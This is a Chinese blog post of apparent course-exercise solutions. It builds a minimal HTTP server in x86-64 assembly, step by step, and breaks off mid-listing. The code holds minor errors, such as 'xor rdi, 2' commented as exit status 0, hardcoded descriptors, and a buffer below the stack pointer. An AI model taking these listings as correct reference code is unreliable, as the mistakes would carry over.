<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Intro to Cybersecurity1. Building a Web Server 1.1 Program that exits使用汇编代码与环境交互 server.s 1234567891011.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀.globl">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn-Intro2Cybersecurity">
<meta property="og:url" content="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/index.html">
<meta property="og:site_name" content="talk is cheap, show me the code.">
<meta property="og:description" content="Intro to Cybersecurity1. Building a Web Server 1.1 Program that exits使用汇编代码与环境交互 server.s 1234567891011.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀.globl">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png">
<meta property="article:published_time" content="2024-06-24T04:23:01.000Z">
<meta property="article:modified_time" content="2024-09-05T11:23:51.574Z">
<meta property="article:author" content="theLonging">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png">

<link rel="canonical" href="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>pwn-Intro2Cybersecurity | talk is cheap, show me the code.</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">talk is cheap, show me the code.</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwn-Intro2Cybersecurity
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-06-24 12:23:01" itemprop="dateCreated datePublished" datetime="2024-06-24T12:23:01+08:00">2024-06-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-05 19:23:51" itemprop="dateModified" datetime="2024-09-05T19:23:51+08:00">2024-09-05</time>
              </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>53k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>48 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h1><h2 id="1-Building-a-Web-Server"><a href="#1-Building-a-Web-Server" class="headerlink" title="1. Building a Web Server"></a>1. Building a Web Server</h2><p><img src="/../images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png" alt="截屏2024-06-26 11.52.31"></p>
<h3 id="1-1-Program-that-exits"><a href="#1-1-Program-that-exits" class="headerlink" title="1.1 Program that exits"></a>1.1 Program that exits</h3><p>使用汇编代码与环境交互</p>
<p><code>server.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀</span><br><span class="line">.globl _start 				 # 声明标签(函数) _start 为全局，_start 是执行开始的地方</span><br><span class="line"></span><br><span class="line">.section .text				 # 指示汇编器开始一个新的代码段（文本段）、这是存放程序指令的地方</span><br><span class="line"></span><br><span class="line">_start: 							 # 程序的入口标签	</span><br><span class="line">    mov rdi, 0				 # rdi 存储传递的第一个参数，这里作为exit系统调用的状态码</span><br><span class="line">    mov rax, 60     	 # SYS_exit 	rax寄存器用于指定系统调用的编号，60对应exit系统调用</span><br><span class="line">    syscall						 # 执行系统调用</span><br><span class="line"></span><br><span class="line">.section .data				 # 新的数据段</span><br></pre></td></tr></table></figure>

<h3 id="1-2-Program-that-creates-a-socket"><a href="#1-2-Program-that-creates-a-socket" class="headerlink" title="1.2 Program that creates a socket"></a>1.2 Program that creates a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET     函数传入的第一个参数</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM 		传入的第二个参数</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP     传入的第三个参数</span><br><span class="line">    syscall # 系统调用</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, 2             # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"> </span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-3-Program-that-binds-a-socket"><a href="#1-3-Program-that-binds-a-socket" class="headerlink" title="1.3 Program that binds a socket"></a>1.3 Program that binds a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    # mov rax, 60            # syscall: exit</span><br><span class="line">    # xor rdi, 3             # exit status 0</span><br><span class="line">    # syscall                # 执行退出</span><br><span class="line">        # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-4-Program-that-listens-on-a-socket"><a href="#1-4-Program-that-listens-on-a-socket" class="headerlink" title="1.4 Program that listens on a socket"></a>1.4 Program that listens on a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-5-Program-that-accepts-a-connection"><a href="#1-5-Program-that-accepts-a-connection" class="headerlink" title="1.5 Program that accepts a connection"></a>1.5 Program that accepts a connection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43 					 # syscall: accept</span><br><span class="line">    mov rdi, 3						 # 绑定socket 3</span><br><span class="line">    mov rsi, 0 						 # NULL</span><br><span class="line">    mov rdx, 0						 # NULL</span><br><span class="line">    syscall					</span><br><span class="line"></span><br><span class="line">    # 检查accept返回值是否为4</span><br><span class="line">    cmp rax, 4</span><br><span class="line">    jne .exit_failure      # 如果不是4，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-6-Program-that-statically-responds-to-an-HTTP-request"><a href="#1-6-Program-that-statically-responds-to-an-HTTP-request" class="headerlink" title="1.6 Program that statically responds to an HTTP request"></a>1.6 Program that statically responds to an HTTP request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response] # 响应内容的位置</span><br><span class="line">    mov rdx, 19           # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 关闭套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request"><a href="#1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request" class="headerlink" title="1.7 Program that dynamically responds to an HTTP GET request"></a>1.7 Program that dynamically responds to an HTTP GET request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 